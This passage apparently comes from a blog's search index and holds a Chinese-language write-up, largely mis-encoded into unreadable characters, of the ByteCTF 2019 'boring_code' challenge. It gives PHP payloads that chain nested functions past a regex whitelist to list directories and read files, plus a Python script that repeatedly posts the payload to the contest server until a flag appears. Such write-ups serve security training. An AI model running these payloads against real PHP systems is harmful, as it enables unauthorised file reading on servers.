class="number">5</span>;</span><br><span class="line">$goal = <span class="number">46</span>;</span><br><span class="line">$res = math_fuzz($orig, $goal);</span><br><span class="line"><span class="keyword">foreach</span>($res <span class="keyword">as</span> $func) &#123;</span><br><span class="line"><span class="keyword">print</span> $func.<span class="string">'('</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $orig;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($res); $i++) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">')'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">' = '</span>.$goal.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>fuzzç»“æœå¦‚ä¸‹å›¾ï¼š</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-49-17.png" alt></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½éå†ç›®å½•ä¸‹æ–‡ä»¶åäº†ï¼Œä½†scandirçš„è¿”å›å€¼æ˜¯ä¸ªæ•°ç»„ç±»å‹ï¼Œphpé‡Œèƒ½è¾“å‡ºæ•°ç»„çš„å‡ ä¸ªå‡½æ•°ï¼ˆå¦‚var_dumpå’Œprint_rï¼‰åœ¨æ­£åˆ™åŒ¹é…ç™½åå•ä¸‹å‡ä¸å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨readfile+endæ¥è¯»å–scandirè¿”å›æ•°ç»„çš„æœ«å°¾å…ƒç´ é‡Œçš„å†…å®¹ï¼ˆå¥½åƒå½“æ—¶æ¯”èµ›æœ‰hint</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹payloadï¼ˆæŠŠè·³è½¬é“¾æ¥åˆ°çš„ç«™ç‚¹å†…å®¹å˜ä¸ºpayloadï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure><p>å‘åŒ…ç»“æœ</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-47-55.png" alt></p><p>ä½†è¿™å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œæ‰€ä»¥è¿˜å¾—ç»§ç»­ï¼ˆflagåœ¨çˆ¶ç›®å½•é‡Œå™¢<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨scandir(next(scandir(chr(46))))æ¥éå†çˆ¶ç›®å½•ä¸‹æ–‡ä»¶åï¼Œä½†çˆ¶ç›®å½•æ–‡ä»¶çš„readfileéœ€è¦åœ¨æ–‡ä»¶åå‰åŠ ä¸Š../ï¼ˆè¿™æ˜¾ç„¶ä¸å¥½å®ç°</p><p>æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©çš„æ€è·¯çš„å…ˆchdiråˆ‡æ¢å½“å‰å·¥ä½œç›®å½•ï¼Œå†è¿›è¡Œæ–‡ä»¶è¯»å–<br>è€Œchdirçš„è¿”å›å€¼æ˜¯ä¸ªtrueï¼ˆboolç±»å‹ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è€ƒè™‘å°†æ•´ä¸ªchdirä½œä¸ºtimeå‡½æ•°çš„å‚æ•°</p><h3 id="timeå‡½æ•°æµ…æ"><a href="#timeå‡½æ•°æµ…æ" class="headerlink" title="timeå‡½æ•°æµ…æ"></a>timeå‡½æ•°æµ…æ</h3><p>ç¿»æ‰‹å†Œæˆ‘ä»¬å‘ç°timeå‡½æ•°çš„å£°æ˜æ˜¯time(void)ï¼Œè¿”å›intï¼Œè¿™ä¸ªvoidå°±ç»™äº†æˆ‘ä»¬å¯ä»¥ä»»æ„ä¼ å€¼çš„æœºä¼šï¼ˆä½†å¯èƒ½ä¼šæœ‰warningï¼Œä¸ç®¡çœ‹ä¸è§</p><p>æœ‰äº†timeå‡½æ•°ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹localtimeå‡½æ•°ï¼Œå¯¹äºå®ƒçš„å‡½æ•°å£°æ˜å¦‚ä¸‹</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_13-43-03.png" alt></p><p>localtime(time(true))å°±èƒ½è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè€Œè¿™ä¸ªæ•°ç»„çš„é¦–ä½å…ƒç´ å°±æ˜¯å½“å‰çš„ç§’æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨å½“å‰ç§’æ•°ä¸º46æ—¶æˆåŠŸå†æ‹¿åˆ°ä¸€æ¬¡chr(46)</p><p>psï¼šphpé‡Œå–é¦–ä¸ªå…ƒç´ çš„å‡½æ•°ç”¨poså’Œcurrentéƒ½å¯ï¼ˆè¿™é‡Œé‡‡ç”¨pos</p><p>ç»™å‡ºæœ€ç»ˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure><p>å†å†™ä¸ªpyè„šæœ¬æ¥è¿ç»­å‘åŒ…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.100.93.189:2512/boring_code.php'</span></span><br><span class="line">data = &#123;<span class="string">'url'</span>: <span class="string">'http://post.baidu.com/safecheck/index?url=x+Z5mMbGPAtT5bBkiEfIO4vDTfcsCssRh5DioYNT33UpgtTWaHrk8IT33QgV1hlBBTwtTfgUQIGUYYnYLaYspm/cr484U4pssMDF8z9+LzC+JwaIavihzSWyZP8Xm7Qhec/AZ+IFwcQwPGbuJnYGNA=='</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">rec = <span class="string">'Test[%2d]'</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">cur += <span class="number">1</span></span><br><span class="line">r = s.post(url, data = data)</span><br><span class="line">print(rec%cur)</span><br><span class="line"><span class="keyword">for</span> sub_r <span class="keyword">in</span> re.findall(<span class="string">r"bytectf\&#123;.*?\&#125;"</span>, r.text):</span><br><span class="line">print(sub_r)</span><br><span class="line">exit(<span class="string">'Got it!'</span>)</span><br><span class="line">time.sleep(<span class="number">0.9</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/2019-10-22-01-51-03-çš„å±å¹•æˆªå›¾.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
